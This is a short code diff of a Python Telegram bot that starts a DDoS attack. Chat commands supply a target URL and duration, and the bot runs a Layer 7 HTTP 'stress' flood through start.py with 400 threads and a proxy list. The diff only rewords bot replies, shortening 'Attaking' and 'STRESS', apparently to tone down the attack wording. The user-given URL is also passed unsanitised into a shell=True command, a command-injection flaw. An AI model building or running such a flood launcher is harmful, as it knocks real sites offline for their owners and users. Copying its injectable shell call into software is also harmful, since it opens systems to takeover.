@@ -19,7 +19,7 @@ def start(update: Update, context: CallbackContext):
 def tmps(update: Update, context: CallbackContext):
   global s
   s = update.message.text.replace('/t', '')
-  update.message.reply_text(f"Attaking Time {s} s")
+  update.message.reply_text(f"A Time {s} s")
   
   
 def speed_start(url):
@@ -28,7 +28,7 @@ def speed_start(url):
       
 def STRESS(update: Update, context: CallbackContext):
   url = update.message.text.replace('/http', '')
-  update.message.reply_text(f"METHOD: HTTP L7 THREADS : 400\n\nSTRESS: Send HTTP Packet With High Byte Time: {s} s")
+  update.message.reply_text(f"METHOD: HTTP L7 THREADS : 400\n\nSTR: Send HTTP Packet With High Byte Time: {s} s")
   url_str = str(url)
   print(url_str)
   p = subprocess.Popen(f'python3 ~/start.py STRESS {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
